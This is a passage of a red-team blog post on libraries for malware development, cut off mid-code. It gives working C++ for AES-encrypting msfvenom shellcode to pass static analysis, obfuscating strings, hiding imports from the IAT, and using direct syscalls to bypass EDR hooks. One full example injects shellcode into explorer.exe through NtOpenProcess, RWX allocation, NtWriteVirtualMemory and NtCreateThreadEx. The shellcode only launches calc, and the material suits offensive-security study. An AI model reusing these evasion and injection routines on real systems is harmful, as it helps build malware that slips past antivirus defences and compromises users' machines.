# https://captmeelo.com/redteam/maldev/2022/02/16/libraries-for-maldev.html

<!DOCTYPE html><html data-scribe="page:button" lang="en" id="facebook" class="no_svg "><body data-scribe="section:share" class=" regular ltr ready" dir="ltr"><div class="container"><div class="col-sm-3"><div class="fixed-condition"> <a href="https://captmeelo.com/"><img class="profile-avatar" src="https://captmeelo.com/static/img/avatar.jpg" height="75px" width="75px"></a><h1 class="author-name">Capt. Meelo</h1><div class="profile-about"> An infosec guy who's constantly seeking for knowledge.</div><hr><ul class="sidebar-nav"> <strong>Navigation</strong><li><a href="https://captmeelo.com/">Home</a></li><li><a class="about" href="https://captmeelo.com/category/redteam">Red Team</a></li><li><a class="about" href="https://captmeelo.com/category/maldev">Malware Dev</a></li><li><a class="about" href="https://captmeelo.com/category/pentest">Pen Test</a></li><li><a class="about" href="https://captmeelo.com/category/mobile">Mobile</a></li><li><a class="about" href="https://captmeelo.com/category/exploitdev">Exploit Dev</a></li><li><a class="about" href="https://captmeelo.com/category/talks">Talks</a></li><li><a class="about" href="https://captmeelo.com/category/research">Research</a></li><li><a class="about" href="https://captmeelo.com/about/">About Me</a></li></ul></div></div><div class="col-sm-8 col-offset-1 main-layout"><span class="time">16 Feb 2022</span> <span class="categories"> » <a href="https://captmeelo.com/category/redteam">redteam</a>, <a href="https://captmeelo.com/category/maldev">maldev</a> </span><div class="content"><div class="post"><p>The use of libraries for development is great especially if you’re a beginner and wanted something that will surely work right out of the box and wanted to save time.</p><p>In this post, I’ll share some of the libraries that I found easy to use and useful during my malware development journey.</p><h2 id="tiny-aes-c">tiny-AES-c</h2><p>When writing malware, it’s a must to encrypt your shellcode. Otherwise, your malware won’t even pass the static analysis. One of the recommended ways of encrypting the shellcode is by using AES, and one of the easiest ways to implement this is by using the <a href="https://github.com/kokke/tiny-AES-c">kokke/tiny-AES-c</a> library.</p><p>To use this library, just add the following header and source files to your project.</p><ul><li><a href="https://raw.githubusercontent.com/kokke/tiny-AES-c/master/aes.hpp">aes.hpp</a></li><li><a href="https://raw.githubusercontent.com/kokke/tiny-AES-c/master/aes.h">aes.h</a></li><li><a href="https://raw.githubusercontent.com/kokke/tiny-AES-c/master/aes.c">aes.c</a></li></ul><p>The following shows an example of how to AES-encrypt (using CBC mode) your shellcode and its corresponding output.</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"lib/aes.hpp"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="c1">// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c </span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00</span><span class="s">"</span><span class="p">;</span>
	<span class="n">SIZE_T</span> <span class="n">shellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"Captain.MeeloIsTheSuperSecretKey"</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">iv</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x9d\x02\x35\x3b\xa3\x4b\xec\x26\x13\x88\x58\x51\x11\x47\xa5\x98</span><span class="s">"</span><span class="p">;</span>

	<span class="k">struct</span> <span class="nc">AES_ctx</span> <span class="n">ctx</span><span class="p">;</span>
	<span class="n">AES_init_ctx_iv</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">);</span>
	<span class="n">AES_CBC_encrypt_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcodeSize</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Encrypted buffer:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">shellcodeSize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div><p><a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/aes-enc-shellcode.png" class="lightbox-image" title="aes-enc-shellcode"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/aes-enc-shellcode.png" alt="AES-encrypted Shellcode"></a></p><p>To decrypt the encrypted shellcode, simply used the <code class="language-plaintext highlighter-rouge">AES_CBC_decrypt_buffer()</code> function.</p><p>Other AES libraries also exist like the following:</p><ul><li><a href="https://github.com/SergeyBel/AES">SergeyBel/AES</a></li><li><a href="https://github.com/kkAyataka/plusaes">kkAyataka/plusaes</a></li></ul><h2 id="skcrypter">skCrypter</h2><p><a href="https://github.com/skadro-official/skCrypter">skadro-official/skCrypter</a> is a compile-time, user-mode and kernel-mode string crypter library. It uses XOR algorithm with a randomized key and has protection against default XOR brute-forcing.</p><p>But why do we need to encrypt/obfuscate our strings? This is done to “hide” some of the arfifacts of your malware. While it may help a little bit against average reverse engineers, obfuscating strings is still a good idea.</p><p>As an example, take a look at the following code which dynamically resolves the <code class="language-plaintext highlighter-rouge">NtDelayExecution</code> function via <code class="language-plaintext highlighter-rouge">GetModuleHandleA</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code> to perform a “sleep” routine.</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">pNtDelayExecution</span><span class="p">)(</span><span class="n">IN</span> <span class="n">BOOLEAN</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PLARGE_INTEGER</span><span class="p">);</span>
	<span class="n">pNtDelayExecution</span> <span class="n">NtDelayExecution</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtDelayExecution</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtDelayExecution"</span><span class="p">);</span>

	<span class="kt">int</span> <span class="n">msDelaynumber</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span>
	<span class="n">LARGE_INTEGER</span>  <span class="n">delayInterval</span><span class="p">;</span>
	<span class="n">delayInterval</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">=</span> <span class="o">-</span><span class="mi">10000</span> <span class="o">*</span> <span class="n">msDelaynumber</span><span class="p">;</span>
	<span class="n">NtDelayExecution</span><span class="p">(</span><span class="n">FALSE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delayInterval</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>If we compile the above code and look for the “<code class="language-plaintext highlighter-rouge">ntdll.dll</code>” and “<code class="language-plaintext highlighter-rouge">NtDelayExecution</code>” strings, they are visible.</p><p><a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-unobfuscated.png" class="lightbox-image" title="skcrypter-unobfuscated"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-unobfuscated.png" alt="Unobfuscated Strings"></a></p><p>If we used functions that are considered malicious, such as the combination of <code class="language-plaintext highlighter-rouge">OpenProcess</code>, <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>, <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>, and <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code>, then our malware might not even pass the static analysis phase of an AV.</p><p>This is where the library <a href="https://github.com/skadro-official/skCrypter">skadro-official/skCrypter</a> comes into play. To use it, just import the header file <code class="language-plaintext highlighter-rouge">skCrypter.h</code> and place the strings you wanted to obfuscate within the <code class="language-plaintext highlighter-rouge">skCrypt()</code> function.</p><p>As a demo, the previous code was modified to hide both the “<code class="language-plaintext highlighter-rouge">ntdll.dll</code>” and “<code class="language-plaintext highlighter-rouge">NtDelayExecution</code>” strings using the <code class="language-plaintext highlighter-rouge">skCrypter.h</code> library:</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"lib/skCrypter.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="k">typedef</span> <span class="n">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">pNtDelayExecution</span><span class="p">)(</span><span class="n">IN</span> <span class="n">BOOLEAN</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PLARGE_INTEGER</span><span class="p">);</span>
	<span class="n">pNtDelayExecution</span> <span class="n">NtDelayExecution</span> <span class="o">=</span> <span class="p">(</span><span class="n">pNtDelayExecution</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="n">skCrypt</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">)),</span> <span class="n">skCrypt</span><span class="p">(</span><span class="s">"NtDelayExecution"</span><span class="p">));</span>

	<span class="kt">int</span> <span class="n">msDelaynumber</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span>
	<span class="n">LARGE_INTEGER</span>  <span class="n">delayInterval</span><span class="p">;</span>
	<span class="n">delayInterval</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">=</span> <span class="o">-</span><span class="mi">10000</span> <span class="o">*</span> <span class="n">msDelaynumber</span><span class="p">;</span>
	<span class="n">NtDelayExecution</span><span class="p">(</span><span class="n">FALSE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">delayInterval</span><span class="p">);</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"Done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>As we can see, the strings disappeared within the binary.</p><p><a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-obfuscated.png" class="lightbox-image" title="skcrypter-obfuscated"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/skcrypter-obfuscated.png" alt="Obfuscated Strings"></a></p><p>I also found the following string encryption libraries, though I haven’t used/tested them:</p><ul><li><a href="https://github.com/JustasMasiulis/xorstr">JustasMasiulis/xorstr</a></li><li><a href="https://github.com/qis/xorstr">qis/xorstr</a></li><li><a href="https://github.com/TyrarFox/encstr">TyrarFox/encstr</a></li><li><a href="https://github.com/pyj2323/StrCrypt">pyj2323/StrCrypt</a></li></ul><h2 id="lazy_importer">lazy_importer</h2><p>WinAPI functions used by binaries are listed in the binary’s <strong>Import Address Table (IAT)</strong>. This is not good in terms of evasion since most anti-malware solutions reads the binary’s <strong>IAT</strong> and checks for the presence of dangerous/malicious functions imported/used.</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>

    <span class="n">CreateProcessW</span><span class="p">(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">notepad.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>

    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
    
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div><p>For example, if the above code was compiled, the function <code class="language-plaintext highlighter-rouge">CreateProcessW</code> is listed in the <strong>IAT</strong> and is flagged by <a href="https://www.winitor.com/download/">PEStudio</a>.</p><p><a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/func-in-iat.png" class="lightbox-image" title="func-in-iat"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/func-in-iat.png" alt="CreateProcessW Lsited in IAT"></a></p><p>This artifact can be easily hidden by utilizing the <a href="https://github.com/JustasMasiulis/lazy_importer">JustasMasiulis/lazy_importer</a> header. Using it is as simple as importing the header file <code class="language-plaintext highlighter-rouge">lazy_importer.hpp</code> and invoking the <code class="language-plaintext highlighter-rouge">LI_FN()</code> function. For example:</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"lib/lazy_importer.hpp"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>

    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>

    <span class="n">LI_FN</span><span class="p">(</span><span class="n">CreateProcessW</span><span class="p">)(</span><span class="s">L"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">notepad.exe"</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="nb">nullptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>

    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
    
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div><blockquote><p><em><strong>NOTE:</strong> Change <code class="language-plaintext highlighter-rouge">NULL</code> values to <code class="language-plaintext highlighter-rouge">nullptr</code> otherwise you’ll get a compilation error.</em></p></blockquote><p>If we look at the <strong>IAT</strong> again, the <code class="language-plaintext highlighter-rouge">CreateProcessW</code> function is not listed anymore.</p><p><a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/no-func-in-iat.png" class="lightbox-image" title="no-func-in-iat"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/no-func-in-iat.png" alt="CreateProcessW Gone from IAT"></a></p><p>The following could also be used as an alternative library to dynamically import functions and modules:</p><ul><li><a href="https://github.com/AmJayden/Lazy-Importer">AmJayden/Lazy-Importer</a></li></ul><h2 id="syswhisper2">SysWhisper2</h2><p>If you’ve been into AV/EDR evasion, I’m sure you’re aware that using <strong>syscalls</strong> is a well-known method to bypass detection controls (such as “User-land Hooking”) by jumping into kernel-mode. And if you heard about <strong>syscalls</strong>, most likely you’re familiar with the tool <a href="https://github.com/jthuraisamy/SysWhispers2">jthuraisamy/SysWhispers2</a>.</p><p>To use the tool, just run the python script <code class="language-plaintext highlighter-rouge">syswhispers.py</code> with the “<strong>Nt*</strong>” functions you want to use to generate the required files. For example:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 syswhispers.py <span class="nt">-f</span> NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtClose <span class="nt">-o</span> syscalls

                  <span class="nb">.</span>                         ,--.
,-. <span class="nb">.</span> <span class="nb">.</span> ,-. <span class="nb">.</span> , , |-. o ,-. ,-. ,-. ,-. ,-.    /
<span class="sb">`</span>-. | | <span class="sb">`</span>-. |/|/  | | | <span class="sb">`</span>-. | | |-<span class="s1">' |   `-. ,-'</span>
<span class="sb">`</span>-<span class="s1">' `-| `-'</span> <span class="s1">' '</span>   <span class="s1">' '</span> <span class="s1">' `-'</span> |-<span class="s1">' `-'</span> <span class="s1">'   `-'</span> <span class="sb">`</span><span class="nt">---</span>
     /|                     |  @Jackson_T
    <span class="sb">`</span>-<span class="s1">'                     '</span>  @modexpblog, 2021

SysWhispers2: Why call the kernel when you can whisper?

Complete! Files written to:
        syscalls.h
        syscalls.c
        syscallsstubs.asm
</code></pre></div></div><p>Then do the following:</p><ol><li>Copy the generated H/C/ASM files into the project folder.</li><li>In Visual Studio, go to Project → Build Customizations… and enable MASM.</li><li>In the Solution Explorer, add the .h and .c/.asm files to the project as header and source files, respectively.</li><li>Go to the properties of the ASM file, and set the Item Type to Microsoft Macro Assembler.</li><li>Ensure that the project platform is set to x64. 32-bit projects are not supported at this time.</li></ol><p>The “<strong>Nt*</strong>” functions can now be used. For example:</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"lib/syscalls.h"</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="c1">// PID of explorer.exe</span>
	<span class="n">DWORD</span> <span class="n">pid</span> <span class="o">=</span> <span class="mi">11256</span><span class="p">;</span>

	<span class="c1">// msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f c </span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00</span><span class="s">"</span><span class="p">;</span>
	<span class="n">SIZE_T</span> <span class="n">shellcodeSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>

	<span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">;</span>
	<span class="n">OBJECT_ATTRIBUTES</span> <span class="n">objectAttributes</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">objectAttributes</span><span class="p">)</span> <span class="p">};</span>
	<span class="n">CLIENT_ID</span> <span class="n">clientId</span> <span class="o">=</span> <span class="p">{</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
	<span class="n">NtOpenProcess</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">objectAttributes</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">clientId</span><span class="p">);</span>

	<span class="n">LPVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">NtAllocateVirtualMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">baseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcodeSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

	<span class="n">NtWriteVirtualMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
	<span class="n">NtCreateThreadEx</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hThread</span><span class="p">,</span> <span class="n">GENERIC_EXECUTE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">NtClose</span><span class="p">(</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="n">NtClose</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div><p>The downside of using this tool is that it’s already signatured by AV, though it can still be bypassed as mentioned in my <a href="https://captmeelo.com/redteam/maldev/2021/11/18/av-evasion-syswhisper.html">previous post</a>.</p><blockquote><p><em>For x86 syscalls, <a href="https://github.com/mai1zhi2/SysWhispers2_x86">mai1zhi2/SysWhispers2_x86</a> could be used.</em></p></blockquote><h2 id="inline_syscall">inline_syscall</h2><p>Aside from being detected by AVs, the other thing that I don’t like with <a href="https://github.com/jthuraisamy/SysWhispers2">jthuraisamy/SysWhispers2</a> is the additional task of re-running the tool and re-importing the generated files every time I need to add or use a new “<strong>Nt*</strong>” functions.</p><p>Good thing, <a href="https://github.com/JustasMasiulis/inline_syscall">JustasMasiulis/inline_syscall</a> solves this issue. To use it, simply import the following files as header files:</p><ul><li><a href="https://github.com/JustasMasiulis/inline_syscall/raw/master/include/in_memory_init.hpp">in_memory_init.hpp</a></li><li><a href="https://github.com/JustasMasiulis/inline_syscall/raw/master/include/inline_syscall.hpp">inline_syscall.hpp</a></li><li><a href="https://github.com/JustasMasiulis/inline_syscall/raw/master/include/inline_syscall.inl">inline_syscall.inl</a></li></ul><p>Then call the initialization function <code class="language-plaintext highlighter-rouge">jm::init_syscalls_list()</code> before using the <code class="language-plaintext highlighter-rouge">INLINE_SYSCALL(function_pointer)</code> and <code class="language-plaintext highlighter-rouge">INLINE_SYSCALL_T(function_type)</code> macros.</p><blockquote><p><em>NOTE: If you’re using Visual Studio, make sure to use <code class="language-plaintext highlighter-rouge">LLVM (clang-cl)</code> as the <strong>Platform Toolset</strong>.</em> <a href="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-clang.png" class="lightbox-image" title="inline-syscall-clang"><img src="https://captmeelo.com/static/img/2022-02-16-libraries-for-maldev/inline-syscall-clang.png" alt="Setting the Platform Toolset"></a></p></blockquote><p>Here’s an example code that utilizes the <code class="language-plaintext highlighter-rouge">INLINE_SYSCALL</code> macro:</p><div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"lib/in_memory_init.hpp"</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_UNICODE_STRING</span>
<span class="p">{</span>
	<span class="n">USHORT</span> <span class="n">Length</span><span class="p">;</span>
	<span class="n">USHORT</span> <span class="n">MaximumLength</span><span class="p">;</span>
	<span class="n">PWSTR</span>  <span class="n">Buffer</span><span class="p">;</span>
<span class="p">}</span> <span class="n">UNICODE_STRING</span><span class="p">,</span> <span class="o">*</span> <span class="n">PUNICODE_STRING</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_OBJECT_ATTRIBUTES</span>
<span class="p">{</span>
	<span class="n">ULONG</span>           <span class="n">Length</span><span class="p">;</span>
	<span class="n">HANDLE</span>          <span class="n">RootDirectory</span><span class="p">;</span>
	<span class="n">PUNICODE_STRING</span> <span class="n">ObjectName</span><span class="p">;</span>
